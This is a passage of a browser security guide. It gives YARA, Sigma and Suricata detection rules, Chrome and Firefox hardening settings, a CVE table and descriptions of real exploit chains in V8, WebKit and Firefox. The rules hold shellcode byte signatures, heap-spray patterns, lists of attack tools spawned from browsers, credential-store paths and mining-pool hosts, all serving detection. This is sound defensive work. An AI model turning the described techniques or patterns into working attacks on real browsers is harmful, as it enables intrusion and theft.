**Code Pointer Table (CPT).** Similar to the EPT but for pointers to executable code (JIT-compiled functions, builtins). CPT entries are validated to point within V8's code space. Corrupting a CPT entry to point outside code space triggers a crash.

**Trusted Pointer Table (TPT).** Stores pointers to trusted V8 internal objects (NativeContext, ScopeInfo). TPT entries are type-tagged and validated.

---

## 20. Detection engineering for browser exploitation

### 20.1 YARA rules

**Rule 1 — Browser exploit shellcode patterns:**

```yara
rule Browser_Exploit_Shellcode_Indicators
{
    meta:
        description = "Detects shellcode patterns common in browser exploit payloads"
        author      = "Security Team"
        date        = "2026-05-08"
        severity    = "CRITICAL"
        reference   = "Chapter 8C §16"

    strings:
        // x86-64 syscall instruction preceded by register setup
        $syscall_execve = { 48 31 f6 56 48 bf 2f 62 69 6e 2f 73 68 00 }
        // VirtualAlloc/VirtualProtect shellcode pattern (Windows)
        $virtualalloc   = { 48 89 ?? 48 c7 c1 00 10 00 00 48 c7 c2 00 40 00 00 }
        // mprotect syscall setup (Linux)
        $mprotect_setup = { b8 0a 00 00 00 48 89 ?? 48 c7 c2 07 00 00 00 0f 05 }
        // Wasm module magic bytes followed by shellcode NOP sled
        $wasm_magic_nop = { 00 61 73 6d 01 00 00 00 [0-64] 90 90 90 90 }
        // JIT spray constant pattern (repeated controlled dwords)
        $jit_spray      = { 25 ?? ?? ?? ?? 25 ?? ?? ?? ?? 25 ?? ?? ?? ?? }

    condition:
        any of them
}
```

**Rule 2 — Wasm RWX page abuse indicators:**

```yara
rule Wasm_RWX_Exploitation_Pattern
{
    meta:
        description = "Detects artifacts of Wasm JIT page exploitation in memory dumps"
        author      = "Security Team"
        date        = "2026-05-08"
        severity    = "HIGH"

    strings:
        // WebAssembly instantiation followed by address leak pattern
        $wasm_inst     = "WebAssembly.Instance" ascii wide
        $wasm_module   = "WebAssembly.Module" ascii wide
        // Float64Array + BigInt64Array (used for address conversion)
        $f64_array     = "Float64Array" ascii wide
        $bi64_array    = "BigInt64Array" ascii wide
        // DataView used for precise memory layout control
        $dataview      = "DataView" ascii wide
        // Pattern: read pointer as float then convert to BigInt
        $addr_conv     = /u64\[0\]\s*=\s*/ ascii
        // Hexadecimal address constants typical of exploit offsets
        $hex_offset    = /0x[0-9a-f]{6,8}n/ ascii

    condition:
        $wasm_inst and $wasm_module and
        ($f64_array or $bi64_array) and
        $dataview and
        ($addr_conv or $hex_offset)
}
```

**Rule 3 — V8 heap spray detection:**

```yara
rule V8_Heap_Spray_Artifacts
{
    meta:
        description = "Detects JavaScript heap spray patterns targeting V8"
        author      = "Security Team"
        date        = "2026-05-08"
        severity    = "HIGH"

    strings:
        // Repeated ArrayBuffer allocation in spray pattern
        $ab_spray  = /new ArrayBuffer\(0x[0-9a-f]+\)/ ascii
        // Large array allocation for element kind manipulation
        $arr_alloc = /new Array\((0x[0-9a-f]{4,}|[0-9]{4,})\)/ ascii
        // Spray loop with controlled size
        $spray_loop = /for\s*\(\s*(?:var|let|const)\s+\w+\s*=\s*0\s*;\s*\w+\s*<\s*(?:0x[0-9a-f]+|[0-9]{3,})\s*;/ ascii
        // StructuredClone abuse for heap grooming
        $struct_clone = "structuredClone" ascii
        // GC trigger (used to consolidate heap)
        $gc_trigger = /(?:gc|collectGarbage)\s*\(\s*\)/ ascii
        // Fill pattern for controlled heap data
        $fill_pattern = /\.fill\(0x[0-9a-f]+\)/ ascii

    condition:
        ($ab_spray and $spray_loop) or
        ($arr_alloc and $spray_loop and ($fill_pattern or $gc_trigger)) or
        ($struct_clone and $spray_loop and $ab_spray)
}
```

### 20.2 Sigma rules

**Rule 1 — Browser crash pattern indicative of exploitation:**

```yaml
title: Suspicious Browser Crash Pattern Indicating Exploitation Attempt
id: b7e3a8f1-4c2d-4e9a-b5f1-8d3c7a2e9f01
status: experimental
description: >
    Detects browser processes crashing with signals (SIGSEGV, SIGBUS, SIGABRT)
    in JIT code regions, suggesting a failed exploit attempt.
date: 2026/05/08
author: Security Team
references:
    - Chapter 8C §16
logsource:
    category: process_crash
    product: linux
detection:
    selection_process:
        Image|endswith:
            - '/chrome'
            - '/chromium'
            - '/firefox'
            - '/safari'
            - '/WebKitWebProcess'
    selection_signal:
        - Signal: 'SIGSEGV'
        - Signal: 'SIGBUS'
        - Signal: 'SIGILL'
        - Signal: 'SIGABRT'
    selection_repeated:
        # Multiple crashes within a short window suggest exploit spraying
        | count() by Image > 3
    timeframe: 5m
    condition: selection_process and selection_signal and selection_repeated
    falsepositives:
        - Legitimate browser crashes from buggy extensions
        - GPU driver issues causing repeated crashes
    level: high
    tags:
        - attack.execution
        - attack.t1203
```

**Rule 2 — Suspicious child process spawned from browser:**

```yaml
title: Suspicious Child Process Spawned by Browser
id: c9f4b2a1-5d3e-4f1a-a6c2-9e4b8d1f7a03
status: experimental
description: >
    Detects a browser renderer process spawning unexpected child processes,
    which may indicate successful sandbox escape and post-exploitation.
date: 2026/05/08
author: Security Team
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\certutil.exe'
            - '\bitsadmin.exe'
            - '\rundll32.exe'
    filter_legitimate:
        # Chrome legitimately spawns helper processes with --type=
        CommandLine|contains: '--type='
    condition: selection_parent and selection_child and not filter_legitimate
    falsepositives:
        - Browser extensions that legitimately launch native messaging hosts
        - Developer tools or debugging configurations
    level: critical
    tags:
        - attack.execution
        - attack.defense_evasion
        - attack.t1203
        - attack.t1059
```

**Rule 3 — Sandbox escape indicators via memory manipulation:**

```yaml
title: Browser Sandbox Escape Indicators
id: d8a5c3b2-6e4f-4a2b-b7d3-0f5c9e2a8b04
status: experimental
description: >
    Detects patterns indicative of browser sandbox escape: mprotect calls
    to make memory executable, or unexpected DLL injection into browser processes.
date: 2026/05/08
author: Security Team
logsource:
    category: sysmon
    product: windows
detection:
    # Detect suspicious image loads in browser renderer processes
    selection_renderer:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
        CommandLine|contains: '--type=renderer'
    selection_suspicious_load:
        ImageLoaded|endswith:
            - '.dll'
        ImageLoaded|contains:
            - '\Temp\'
            - '\AppData\Local\Temp\'
            - '\Downloads\'
            - '\Users\Public\'
    condition: selection_renderer and selection_suspicious_load
    falsepositives:
        - Legitimate accessibility tools injecting into browsers
        - Antivirus real-time protection hooks
    level: high
    tags:
        - attack.defense_evasion
        - attack.privilege_escalation
        - attack.t1055
```

### 20.3 Suricata rules for exploit kit delivery

```
alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"EXPLOIT_KIT Landing - Obfuscated JS Redirect";
    flow:established,to_client;
    content:"text/html"; http_header;
    content:"eval("; content:"String.fromCharCode"; distance:0; within:200;
    pcre:"/eval\s*\(\s*(?:unescape|decodeURIComponent|String\.fromCharCode|atob)\s*\(/";
    classtype:exploit-kit; sid:2030001; rev:1;
)

alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"EXPLOIT Suspicious Wasm Module Delivery";
    flow:established,to_client;
    content:"|00 61 73 6d|"; offset:0; depth:4;
    content:"application/wasm"; http_header;
    content:"|00|"; offset:8; depth:1;
    classtype:exploit-kit; sid:2030002; rev:1;
)

alert http $EXTERNAL_NET any -> $HOME_NET any (
    msg:"EXPLOIT Post-Exploitation PE Payload via Browser";
    flow:established,to_client;
    content:"application/octet-stream"; http_header;
    content:"|4d 5a|"; offset:0; depth:2;
    flowbits:isset,exploit_kit_landing;
    classtype:trojan-activity; sid:2030003; rev:1;
)
```

### 20.4 EDR detection of browser exploitation patterns

**Behavioral indicators for EDR rules:**

1. **Anomalous memory operations.** A browser renderer process calling `mprotect` (Linux) or `VirtualProtect` (Windows) to make heap regions executable. Renderers should never need RWX heap pages outside of JIT compilation.

2. **Unexpected network connections post-crash.** A browser process crashes, then a new child process (spawned before the crash) initiates outbound connections to unusual destinations. Indicates successful exploitation with payload delivery.

3. **Renderer process privilege escalation.** Monitor for a browser renderer process that acquires unexpected handles or tokens: opening handles to the browser main process (via `OpenProcess` on Windows), reading other processes' memory, or loading unsigned DLLs.

4. **Abnormal file access from browser.** A browser process writing to system directories, modifying the registry (`HKLM`), or accessing credential stores (`SAM`, `/etc/shadow`, macOS Keychain) outside normal browser operation.

5. **ETW indicators (Windows).** Event ID 4688 (process creation) with browser parent + suspicious child. Event ID 10 (process access) where renderer accesses browser process. Event ID 7 (image load) where renderer loads unexpected DLLs from temp paths.

---

## 21. Browser hardening configuration

### 21.1 Chrome enterprise policies (JSON format)

Chrome enterprise policies can be deployed via Group Policy (Windows), managed preferences (macOS), or JSON policy files (Linux: `/etc/opt/chrome/policies/managed/`).

```json
{
  "ExtensionInstallBlocklist": ["*"],
  "ExtensionInstallAllowlist": ["cjpalhdlnbpafiamejdnhcphjbkeiagm"],
  "SitePerProcess": true,
  "IsolateOrigins": "https://accounts.google.com,https://banking.example.com",
  "DefaultJavaScriptJitSetting": 2,
  "BrowserSignin": 0,
  "PasswordManagerEnabled": false,
  "AutofillCreditCardEnabled": false,
  "DefaultPopupsSetting": 2,
  "DefaultNotificationsSetting": 2,
  "DefaultGeolocationSetting": 2,
  "DefaultSensorsSetting": 2,
  "DefaultUsbGuardSetting": 2,
  "DefaultWebBluetoothGuardSetting": 2,
  "DnsOverHttpsMode": "secure",
  "DnsOverHttpsTemplates": "https://dns.example.com/dns-query",
  "BlockThirdPartyCookies": true,
  "SafeBrowsingProtectionLevel": 2,
  "DownloadRestrictions": 4,
  "SSLVersionMin": "tls1.2",
  "AudioCaptureAllowed": false,
  "VideoCaptureAllowed": false,
  "WebRtcIPHandling": "disable_non_proxied_udp"
}
```

**Key policies:** `ExtensionInstallBlocklist: ["*"]` blocks all extensions except allowlisted IDs. `DefaultJavaScriptJitSetting: 2` disables V8 JIT for all sites (forces interpreter-only mode). `SitePerProcess: true` enforces strict site isolation. `IsolateOrigins` upgrades specific origins to per-origin process isolation. `DownloadRestrictions: 4` blocks all downloads. `WebRtcIPHandling: "disable_non_proxied_udp"` prevents WebRTC IP leaks.

### 21.2 Firefox about:config security hardening (15+ entries)

```
// Anti-fingerprinting
privacy.resistFingerprinting                     = true
privacy.resistFingerprinting.letterboxing        = true

// Disable WebRTC IP leak
media.peerconnection.ice.no_host                 = true
media.peerconnection.ice.default_address_only    = true

// Disable telemetry and experiments
toolkit.telemetry.enabled                        = false
app.normandy.enabled                             = false
app.shield.optoutstudies.enabled                 = false
datareporting.policy.dataSubmissionEnabled        = false

// Network security
network.dns.disablePrefetch                      = true
network.prefetch-next                            = false
network.http.speculative-parallel-limit           = 0
dom.security.https_only_mode                     = true
network.IDN_show_punycode                        = true

// JavaScript / JIT hardening
javascript.options.baselinejit                    = false
javascript.options.ion                            = false
javascript.options.wasm                           = false
javascript.options.asmjs                          = false

// Privacy
privacy.trackingprotection.enabled                = true
privacy.trackingprotection.socialtracking.enabled  = true
network.cookie.cookieBehavior                     = 5

// Content security
dom.disable_open_during_load                     = true
dom.popup_allowed_events                         = click dblclick mousedown pointerdown
security.mixed_content.block_active_content       = true
security.mixed_content.block_display_content      = true

// Disable dangerous features
dom.allow_scripts_to_close_windows                = false
dom.storage.enabled                              = true
dom.indexedDB.enabled                            = true
media.navigator.enabled                          = false

// Certificate and TLS
security.ssl.require_safe_negotiation             = true
security.tls.version.min                          = 3
security.OCSP.enabled                            = 1
security.OCSP.require                            = true
security.cert_pinning.enforcement_level           = 2
```

Setting `javascript.options.baselinejit = false` and `javascript.options.ion = false` disables SpiderMonkey's JIT compilers, running JavaScript in interpreter-only mode. Combined with `javascript.options.wasm = false`, this eliminates the entire JIT attack surface. Performance degradation is significant (3-10x slower JavaScript execution) but acceptable for high-security environments where the threat of browser exploitation outweighs performance needs.

### 21.3 Group Policy / MDM browser lockdown

**Windows Group Policy.** Chrome/Edge ADMX templates map to the JSON policies above. Key GPO path: `Computer Configuration → Administrative Templates → Google Chrome → Content Settings → Default JavaScript JIT setting = Block JIT`. Install templates from `https://dl.google.com/dl/edgedl/chrome/policy/policy_templates.zip`.

**macOS MDM.** Deploy via `.mobileconfig` profiles with `com.google.Chrome` payload type, setting the same keys as the JSON policy format.

### 21.4 V8 JIT-less mode for high-security environments

JIT compilation is the dominant attack surface in modern browsers. Disabling JIT eliminates:
- TurboFan type confusion bugs (§3.3, §16)
- JIT spraying (§3.3)
- Wasm JIT code page abuse (§16.5)
- Maglev/Sparkplug optimization bugs
- JIT code as a ROP/JOP gadget source

**Deployment options:**

| Method | Scope | Setting |
|--------|-------|---------|
| Chrome policy `DefaultJavaScriptJitSetting=2` | All sites | Enterprise policy |
| Chrome policy `JavaScriptJitAllowedForSites` | Per-site allowlist | Enterprise policy — allow JIT only for trusted apps |
| `chrome://flags/#v8-jitless` | Per-browser | Manual toggle |
| V8 flag `--jitless` | V8 embedder | Programmatic |
| Firefox `javascript.options.ion=false` + `baselinejit=false` | Per-browser | about:config |

**Performance impact.** JIT-less V8 runs JavaScript 3-10x slower on compute-heavy workloads. For typical web browsing (DOM manipulation, small scripts), the impact is 1.5-3x. Wasm-heavy applications (CAD, video editing in browser) become effectively unusable without JIT.

**Recommended deployment.** Enable JIT-less mode for:
- Kiosk systems with known application set
- Government/classified terminals
- Financial trading terminals (where the browser is only used for specific internal apps)
- High-value targets (executives, IT admins) where the risk of targeted browser exploitation outweighs the performance cost

Use per-site JIT allowlisting (`JavaScriptJitAllowedForSites`) to enable JIT only for trusted internal applications while blocking it for general web browsing.

---

## 22. CVE reference table — browser internals

| CVE ID | Year | Component | Vulnerability class | Exploitation | CVSS |
|--------|------|-----------|-------------------|-------------|------|
| CVE-2019-5786 | 2019 | Blink (FileReader) | Use-after-free | In the wild (APT). Chained with CVE-2019-0808 (Win32k LPE) for full sandbox escape. | 8.8 |
| CVE-2019-0808 | 2019 | Windows win32k.sys | NULL pointer dereference (LPE) | In the wild. Sandbox escape component of CVE-2019-5786 chain. | 7.8 |
| CVE-2019-13768 | 2019 | Mojo (FileSystemManager) | Logic bug in path validation | Sandbox escape — renderer to browser process file access. | 9.6 |
| CVE-2020-6418 | 2020 | V8 (TurboFan) | Type confusion (incorrect side-effect modeling in JSCreate) | In the wild (TAG). Renderer RCE, chained for sandbox escape. | 8.8 |
| CVE-2021-21220 | 2021 | V8 (TurboFan) | Incorrect JIT code for x86-64 math operations | Pwn2Own 2021 — full chain with Mojo sandbox escape. | 8.8 |
| CVE-2021-21224 | 2021 | V8 (TurboFan) | Integer overflow in ChangeInt32ToInt64 | Renderer RCE via OOB TypedArray access. | 8.8 |
| CVE-2021-30551 | 2021 | V8 (Map transitions) | Type confusion during Map transition | In the wild (P0). Stale Map assumption after redundancy elimination. | 8.8 |
| CVE-2021-30632 | 2021 | V8 (TurboFan) | OOB write via incorrect bounds analysis | In the wild. TurboFan Typer computed incorrect range for bitwise ops. | 8.8 |
| CVE-2022-1096 | 2022 | V8 (Runtime) | Type confusion in Runtime_FunctionCallback | In the wild. Details restricted due to active exploitation. | 8.8 |
| CVE-2023-2033 | 2023 | V8 (TurboFan) | Type confusion in JIT optimization | In the wild (TAG). Chrome 112 patch within days. | 8.8 |
| CVE-2023-4863 | 2023 | libwebp (image decoder) | Heap buffer overflow in Huffman table construction | In the wild. Reached via web content rendering. Also affected Firefox, Safari, electron apps. | 8.8 |
| CVE-2024-0519 | 2024 | V8 | OOB memory access | In the wild. Triggered via crafted JavaScript. | 8.8 |
| CVE-2024-2887 | 2024 | V8 (Wasm) | Type confusion in WebAssembly | Pwn2Own Vancouver 2024 — Manfred Paul. Full chain with sandbox escape. | 8.8 |
| CVE-2024-3159 | 2024 | V8 | OOB memory access via API | Pwn2Own Vancouver 2024 — Edouard Bochin, Tao Yan. Renderer RCE. | 8.8 |

---

## 23. Browser exploit chain case studies

### 23.1 Pwn2Own 2023–2024 Chrome full chain reconstruction

**Manfred Paul — Pwn2Own Vancouver 2024.** The full chain comprised three stages:

1. **Renderer RCE (CVE-2024-2887).** A V8 type confusion in WebAssembly. The attacker manipulated Wasm object types through a sequence of function calls that caused TurboFan to emit JIT code operating on a Wasm struct with an incorrect type assumption. This gave controlled out-of-bounds read/write within the V8 heap, enabling `addrof`/`fakeobj` primitives (§16.1–16.2). The primitive was used to construct a fake `ArrayBuffer` backing store pointer, providing arbitrary read/write within the renderer process.

2. **Sandbox escape (CVE-2024-3159).** With arbitrary read/write established, the exploit corrupted Mojo interface pointers (§17.3) to hijack a privileged IPC channel between the renderer and the browser process. The specific target was a Mojo receiver for a file-handling interface, allowing the attacker to request file operations outside the sandbox. This is the same class of Mojo IPC exploitation described in §17.

3. **Post-exploitation.** Once executing code in the browser process, the attacker had full user-level access (cookie jar, credential store, filesystem). No kernel exploit was required because the browser process is unsandboxed.

**Chain diagram:**

```
┌──────────────┐     ┌──────────────────┐     ┌─────────────────┐
│ V8 Wasm type │     │ Mojo IPC hijack  │     │ Browser process │
│ confusion    │────>│ (renderer→browser│────>│ code execution  │
│ CVE-2024-2887│     │  CVE-2024-3159)  │     │ (unsandboxed)   │
└──────────────┘     └──────────────────┘     └─────────────────┘
    Stage 1:              Stage 2:                 Stage 3:
  Renderer RCE         Sandbox escape          Post-exploitation
```

**Detection indicators:**
- Anomalous Wasm compilation patterns (large Wasm modules with unusual type section layouts)
- Mojo message validation failures logged in `chrome://crash-internals/`
- Renderer process crash followed by browser process child spawning unexpected processes
- Sigma detection for Pwn2Own-style chains:

```yaml
title: Chrome Renderer Crash Followed by Suspicious Browser Process Activity
id: 8c4e2f1a-3d7b-4a9e-b5c1-2f8d6e4a7b3c
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    renderer_crash:
        ParentImage|endswith: '\chrome.exe'
        Image|endswith: '\chrome.exe'
        CommandLine|contains: '--type=renderer'
    suspicious_child:
        ParentImage|endswith: '\chrome.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\wscript.exe'
            - '\mshta.exe'
    condition: renderer_crash | suspicious_child
level: high
tags:
    - attack.execution
    - attack.t1203
```

**Patches applied:** Chrome 123.0.6312.86/.87 (2024-03-26).

**Edouard Bochin and Tao Yan — Pwn2Own Vancouver 2024.** Independent chain targeting V8 via CVE-2024-3159 (OOB memory access through the V8 API). The exploit used a crafted sequence of API calls to read memory outside the V8 heap boundaries, leaking renderer process memory. Combined with a separate sandbox escape for full chain demonstration.

### 23.2 Safari WebKit exploitation (CVE-2023-32409, CVE-2023-41993)

**CVE-2023-32409 — WebKit sandbox escape.** Reported by Clément Lecigne (Google TAG) and Donncha Ó Cearbhaill (Amnesty International Security Lab). A logic bug in WebKit's IPC layer allowed a web content process to break out of the Web Content sandbox on macOS/iOS. The vulnerability was in the boundary between the WebContent process and the Networking process, where insufficient validation of serialized objects allowed the attacker to influence cross-process state.

**CVE-2023-41993 — WebKit processing arbitrary web content.** A type confusion in JavaScriptCore (JSC), WebKit's JavaScript engine. Triggered via crafted HTML content, the vulnerability allowed arbitrary code execution in the WebContent process. Exploited in the wild as part of a chain targeting iOS devices.

**Full iOS exploitation chain (as documented by Citizen Lab):**

```
┌─────────────────┐     ┌──────────────────┐     ┌──────────────┐
│ JSC type         │     │ WebKit sandbox   │     │ Kernel exploit│
│ confusion        │────>│ escape           │────>│ (or PAC bypass│
│ CVE-2023-41993   │     │ CVE-2023-32409   │     │  + kexec)     │
└─────────────────┘     └──────────────────┘     └──────────────┘
    Stage 1:               Stage 2:                Stage 3:
  WebContent RCE        Sandbox escape          Kernel/root
```

**Detection:** Monitor for Safari/WebKit crash reports correlating with `com.apple.WebKit.WebContent` process restarts. On macOS, the `CrashReporter` logs at `~/Library/Logs/DiagnosticReports/` contain crash threads with JSC frames. Anomalous patterns:

```bash
# Check for WebContent crashes on macOS
log show --predicate 'subsystem == "com.apple.WebKit"' \
  --style compact --last 1h | grep -i 'crash\|exception\|SIGABRT'

# Inspect crash reports for JSC frames
grep -rl 'JavaScriptCore' ~/Library/Logs/DiagnosticReports/ | \
  xargs grep -l 'EXC_BAD_ACCESS'
```

**Patches applied:** iOS 16.5 (2023-05-18) for CVE-2023-32409; iOS 17.0.1 (2023-09-21) for CVE-2023-41993.

### 23.3 Firefox IPC exploitation case studies

Firefox's Fission architecture (§8) splits content processes by site, analogous to Chromium's site isolation. IPC between content and parent processes uses IPDL actors. Exploitation requires:

1. **Content process RCE.** Typically via SpiderMonkey (JavaScript engine) vulnerability — JIT bug, type confusion, or wasm bug.
2. **IPDL actor abuse.** The compromised content process sends crafted IPDL messages to the parent process. Unlike Mojo, IPDL messages are validated by generated code that checks parameter types but historically has had weaker semantic validation.

**CVE-2023-4045 — Firefox Offscreen Canvas.** An `OffscreenCanvas` cross-origin image data leak allowed a content process to read pixel data from cross-origin images. While not a full sandbox escape, it demonstrated IPDL validation gaps where the parent process trusted content-process assertions about canvas origin.

**CVE-2024-9680 — Firefox use-after-free in Animation timelines.** Discovered by Damien Schaeffer (ESET). A use-after-free in the animation timeline component allowed arbitrary code execution in the content process. Exploited in the wild in October 2024, chained with a Windows kernel vulnerability (CVE-2024-49039, Windows Task Scheduler LPE) for full system compromise. The chain bypassed Firefox sandbox via the kernel escalation rather than IPDL escape.

```
┌──────────────────┐     ┌──────────────────┐     ┌───────────────┐
│ Animation UAF    │     │ Windows kernel   │     │ SYSTEM-level  │
│ CVE-2024-9680    │────>│ Task Scheduler   │────>│ code execution│
│ (content process)│     │ CVE-2024-49039   │     │               │
└──────────────────┘     └──────────────────┘     └───────────────┘
    Stage 1:               Stage 2:                 Stage 3:
  Content RCE           Kernel LPE (bypass       Full compromise
                        sandbox via kernel)
```

**Detection — Suricata rule for post-exploitation beacon after Firefox chain:**

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET EXPLOIT Post-exploitation beacon after Firefox content process crash"; flow:to_server,established; content:"POST"; http_method; content:"Mozilla/5.0"; http_header; pcre:"/^[A-Za-z0-9+\/]{100,}={0,2}$/P"; threshold:type threshold, track by_src, count 5, seconds 60; classtype:trojan-activity; sid:20241001; rev:1;)
```

### 23.4 In-the-wild 0-day chains: Intellexa Predator and NSO Pegasus browser vectors

**Intellexa Predator (2023 — documented by Google TAG and Citizen Lab).** The Predator spyware delivery chain observed in September 2023 targeted iOS and Android via browser-based exploit chains:

- **iOS vector:** Man-in-the-middle injection of exploit page into HTTP traffic (no HTTPS). Safari rendered the page, triggering a WebKit vulnerability for WebContent process RCE, followed by a sandbox escape and kernel exploit. The entire chain was zero-click — no user interaction beyond visiting any HTTP page.
- **Android vector:** Chrome exploit chain using a V8 type confusion for renderer RCE, followed by a Chrome sandbox escape via Mojo IPC, then a kernel exploit targeting the Android Linux kernel.

**NSO Pegasus browser vectors (2021–2023).** While Pegasus is primarily known for iMessage-based FORCEDENTRY (CVE-2021-30860), browser-based delivery has been documented:

- **One-click links:** SMS/WhatsApp messages containing links to exploit pages. The pages profiled the target's browser (User-Agent, JavaScript feature detection) and served tailored exploits for Safari/Chrome.
- **Network injection:** Similar to Predator, ISP-level injection redirecting HTTP requests to exploit servers.

**FORCEDENTRY-style zero-click browser exploitation patterns.** The FORCEDENTRY exploit (targeting iMessage's `ImageIO` via a crafted PDF with JBIG2 streams) established a pattern applicable to browser zero-click:

1. **Reach:** Exploit a parser that processes attacker-controlled data without user interaction (push notifications, preloading, background sync, Service Workers).
2. **Primitive construction:** Use the parser vulnerability to build a computation primitive (FORCEDENTRY used JBIG2 logical operators as a Turing-complete virtual machine).
3. **Sandbox escape:** Chain with a second vulnerability to escape the content sandbox.
4. **Persistence:** Install implant that survives process restart (but not reboot on iOS).

**Browser-specific zero-click vectors:**
- Push notification rendering (the browser parses notification content including images)
- Service Worker `fetch` event handlers that process attacker-controlled responses
- Prerender/prefetch of attacker-controlled URLs (Speculation Rules API)
- Background sync processing

**Detection — YARA rule for FORCEDENTRY-style JBIG2 exploit PDFs:**

```yara
rule FORCEDENTRY_JBIG2_Exploit {
    meta:
        description = "Detects JBIG2-based exploit patterns similar to FORCEDENTRY"
        author = "Browser Security Team"
        reference = "Citizen Lab - FORCEDENTRY analysis"
        date = "2024-01-15"
    strings:
        $pdf_header = "%PDF-"
        $jbig2_stream = "/Filter /JBIG2Decode"
        $large_jbig2 = /\/JBIG2Globals\s+\d+\s+0\s+R/
        $suspicious_size = /\/Length\s+(1[0-9]{5,}|[2-9][0-9]{5,})/
    condition:
        $pdf_header at 0 and $jbig2_stream and $large_jbig2 and $suspicious_size
}
```

---

## 24. WebAssembly security deep dive

### 24.1 Wasm linear memory isolation model

WebAssembly executes within a sandboxed linear memory — a contiguous, bounds-checked byte array. The V8 implementation allocates Wasm linear memory via `ArrayBuffer` backed by a guard-region-protected virtual memory mapping:

```
┌────────────────────────────────────────────────────┐
│  Guard region (unmapped, 8 GB)                     │
│  ┌──────────────────────────────┐                  │
│  │ Wasm linear memory           │                  │
│  │ (up to 4 GB, growable)       │                  │
│  │ Bounds checked via guard     │                  │
│  │ pages (trap on OOB access)   │                  │
│  └──────────────────────────────┘                  │
│  Guard region (unmapped)                           │
└────────────────────────────────────────────────────┘
```

**Bounds checking.** On 64-bit platforms, V8 uses virtual memory guard regions (up to 8 GB of reserved-but-uncommitted address space around the Wasm memory). Any out-of-bounds access traps via a segfault (`SIGSEGV`/`SIGBUS`), which the V8 signal handler converts to a Wasm trap. This is faster than explicit bounds checks on every memory access.

**Bypass attempts.** Wasm memory isolation can be compromised if:
- A V8 bug (type confusion in Wasm compilation, §16) allows corrupting the Wasm memory base pointer or bounds — the attacker can redirect Wasm memory operations to arbitrary addresses.
- The guard region size is insufficient on 32-bit platforms (where address space is limited), allowing integer overflow in address calculation to wrap around into valid memory.
- Shared memory (`SharedArrayBuffer` backed Wasm memory) introduces TOCTOU races if bounds checks and accesses are not atomic.

### 24.2 Wasm JIT compilation security

Wasm modules are compiled to native code by V8's Liftoff (baseline) and TurboFan (optimizing) compilers. Historically, JIT-compiled code lived in RWX (read-write-execute) memory pages — a critical security concern because an attacker with arbitrary write could inject shellcode directly into executable pages (§16.5).

**RWX elimination in modern V8.** V8 now uses W^X (write XOR execute) for Wasm code:

```
Compilation phase:  mmap(RW-)  →  write native code  →  mprotect(R-X)
Patching phase:     mprotect(RW-)  →  patch  →  mprotect(R-X)
```

The `--wasm-write-protect-code-memory` flag (enabled by default since Chrome 111) ensures Wasm code pages are never simultaneously writable and executable. The V8 Sandbox (§19.4) further isolates Wasm code pages within the sandbox's virtual address range.

**Thread safety.** On multi-threaded Wasm (using `SharedArrayBuffer` + `Atomics`), code patching requires:
1. `mprotect(RW-)` on the code page
2. Write the patch
3. Memory fence (`std::atomic_thread_fence`)
4. `mprotect(R-X)`
5. Flush instruction cache (`__builtin___clear_cache` or equivalent)

Between steps 1 and 4, a concurrent thread could theoretically execute partially-written code. V8 mitigates this by suspending all threads executing Wasm code in the isolate during patching (a "safepoint").

### 24.3 WASI security model and capability-based sandboxing

The WebAssembly System Interface (WASI) extends Wasm beyond the browser with a capability-based security model:

- **File descriptors as capabilities.** A WASI program cannot open arbitrary files; it can only access pre-opened file descriptors passed by the host. `fd_prestat_get` enumerates pre-opened directories, and all file operations are scoped to those directories.
- **No ambient authority.** Unlike POSIX, WASI has no concept of a global filesystem root, environment variables (unless explicitly passed), or network sockets (unless the `wasi:sockets` proposal is enabled).
- **Fine-grained permissions.** The WASI runtime grants capabilities at module instantiation:

```bash
# Wasmtime: grant read-only access to /data, read-write to /output
wasmtime run \
  --dir /data::/data:readonly \
  --dir /output::/output \
  --env "API_KEY=${API_KEY}" \
  module.wasm

# No network, no other filesystem, no env vars beyond API_KEY
```

**Security implications for browser-side Wasm.** Browser Wasm does not use WASI — it operates within the browser's existing sandbox. However, WASI's capability model is relevant for server-side Wasm runtimes (Wasmtime, Wasmer, WasmEdge) used in edge computing and plugin systems, where the security boundary is between the host and the Wasm module rather than between the browser and web content.

### 24.4 Wasm component model security implications

The Wasm Component Model (proposal) introduces typed interfaces between Wasm modules:

- **Interface types** define the contract between components (no shared linear memory).
- **Canonical ABI** handles serialization/deserialization across component boundaries.
- **Resource types** provide handle-based access to host resources (similar to WASI capabilities).

**Security benefit:** Components cannot access each other's linear memory. A vulnerability in one component cannot corrupt another component's state — isolation is enforced by the runtime, not by software convention.

**Security risk:** The canonical ABI introduces a serialization/deserialization boundary. Bugs in the ABI implementation (buffer overflows in string copying, integer overflows in list length handling) become the new attack surface.

### 24.5 Wasm-based cryptomining detection

Wasm's near-native performance makes it the preferred execution environment for in-browser cryptominers (CoinHive successors).

**Detection signals:**
- Sustained high CPU usage from a renderer process executing Wasm code
- Wasm module with characteristic hash function patterns (CryptoNight, RandomX, Argon2)
- Network traffic to known mining pool endpoints (Stratum protocol over WebSocket)

**Detection — Sigma rule for Wasm cryptomining:**

```yaml
title: Browser WebAssembly Cryptomining Indicators
id: 5d2a8f3e-1b7c-4e6d-a9f0-3c8b5d2e1a4f
status: experimental
logsource:
    category: proxy
    product: any
detection:
    wasm_download:
        c-uri|endswith:
            - '.wasm'
        cs-bytes|gt: 500000
    mining_pool:
        c-uri|contains:
            - 'stratum+tcp'
            - 'pool.minexmr'
            - 'pool.hashvault'
            - 'xmrpool.eu'
            - 'monerohash.com'
    condition: wasm_download or mining_pool
level: medium
tags:
    - attack.resource_hijacking
    - attack.t1496
```

**CLI detection — identify Wasm modules with mining signatures:**

```bash
# Extract Wasm modules from browser cache (Chrome)
find ~/.config/google-chrome/Default/Cache -type f -exec \
  file {} \; | grep -i 'wasm'

# Disassemble Wasm and search for cryptographic function names
wasm-objdump -x suspected.wasm | grep -iE \
